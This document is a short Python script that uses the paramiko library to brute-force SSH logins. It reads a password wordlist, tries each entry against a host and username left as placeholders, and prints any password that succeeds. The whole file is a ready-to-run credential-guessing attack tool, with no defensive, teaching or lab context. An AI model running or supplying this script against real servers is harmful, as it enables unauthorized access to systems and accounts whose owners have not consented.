import paramiko

def ssh_bruteforce(host, username, password_file):

    with open(password_file, 'r',) as file:
        passwords = [line.strip() for line in file if line.strip()]

    for password in passwords:
        try:
            print(f"Trying: {password}")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=host, username=username, password=password, timeout=3)
            print(f"[+] Password Found: {password}")
            client.close()
            break
        except paramiko.AuthenticationException:
            print("[-] Incorrect Password")
        except Exception as e:
            print(f"[!] Error: {e}")

ssh_bruteforce("(ADD IP HERE)", "USERNAME", "passwords.txt")
